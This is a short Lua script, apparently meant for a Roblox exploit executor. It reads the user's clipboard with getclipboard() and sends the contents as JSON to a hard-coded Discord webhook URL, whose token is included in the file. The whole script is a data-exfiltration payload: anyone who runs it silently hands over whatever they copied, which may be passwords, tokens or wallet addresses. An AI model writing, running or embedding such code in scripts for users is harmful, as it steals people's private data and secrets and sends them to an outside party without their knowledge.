local HttpService = game:GetService("HttpService")

local webhookUrl = "https://discord.com/api/webhooks/1538114395635322890/9wXtXk8J4SWljX6Ji4-qravoPwF1V8pCkYMTPTZ6gY2WUHrMXEbb1j4NwUE35I3II3Su"

local clip = getclipboard()

local data = {
    content = clip
}

local json = HttpService:JSONEncode(data)

request({
    Url = webhookUrl,
    Method = "POST",
    Headers = {
        ["Content-Type"] = "application/json"
    },
    Body = json
})
